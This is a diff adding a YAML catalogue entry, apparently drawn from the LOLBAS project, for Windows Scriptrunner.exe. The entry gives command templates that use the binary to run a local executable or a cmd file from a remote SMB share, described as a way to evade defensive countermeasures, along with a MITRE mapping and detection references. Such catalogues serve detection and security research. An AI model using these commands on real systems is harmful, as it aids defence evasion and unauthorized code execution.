@@ -1,0 +1,98 @@
+id: lolbas/T1NCaW5hcmllcy9TY3JpcHRydW5uZXIueW1s/RXhlY3V0ZQ/1
+type: binary
+platform: windows
+name: Scriptrunner.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1218
+opsec:
+  noise: high
+  triggers: Scriptrunner.exe should not be in use unless App-v is deployed
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_servu_susp_child_process.yml
+commands:
+- template: ScriptRunner.exe -appvscript {PATH_SMB:.cmd}
+  comment: Executes cmd file from remote server
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Scriptrunner/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Scriptrunner.exe
+      category: Execute
+      privileges: User
+      mitre_id: T1218
+      source_file: OSBinaries/Scriptrunner.yml
+      command_source_index: 1
+      document_utf8: "---\nName: Scriptrunner.exe\nDescription: Execute binary through proxy binary to\
+        \ evade defensive counter measures\nAuthor: Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command:\
+        \ Scriptrunner.exe -appvscript {PATH:.exe}\n    Description: Executes executable\n    Usecase:\
+        \ Execute binary through proxy binary to evade defensive counter measures\n    Category: Execute\n\
+        \    Privileges: User\n    MitreID: T1202\n    OperatingSystem: Windows vista, Windows 7, Windows\
+        \ 8, Windows 8.1, Windows 10, Windows 11\n    Tags:\n      - Execute: EXE\n  - Command: ScriptRunner.exe\
+        \ -appvscript {PATH_SMB:.cmd}\n    Description: Executes cmd file from remote server\n    Usecase:\
+        \ Execute binary through proxy binary from external server to evade defensive counter measures\n\
+        \    Category: Execute\n    Privileges: User\n    MitreID: T1218\n    OperatingSystem: Windows\
+        \ vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n    Tags:\n      - Execute:\
+        \ Remote\n      - Execute: CMD\nFull_Path:\n  - Path: C:\\Windows\\System32\\scriptrunner.exe\n\
+        \  - Path: C:\\Windows\\SysWOW64\\scriptrunner.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_servu_susp_child_process.yml\n\
+        \  - IOC: Scriptrunner.exe should not be in use unless App-v is deployed\nResources:\n  - Link:\
+        \ https://twitter.com/KyleHanslovan/status/914800377580503040\n  - Link: https://twitter.com/NickTyrer/status/914234924655312896\n\
+        \  - Link: https://github.com/MoooKitty/Code-Execution\nAcknowledgement:\n  - Person: Nick Tyrer\n\
+        \    Handle: '@nicktyrer'\n"
+      document_sha256: sha256:51b8e76309856012da727e66d1641dc2f47fbab58cefd07e9d436ff40cacd790
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Scriptrunner/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1218
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:87958e3105dd5a30bc251bdf6c8243599b2216e56a18f773bc926baa444723f8
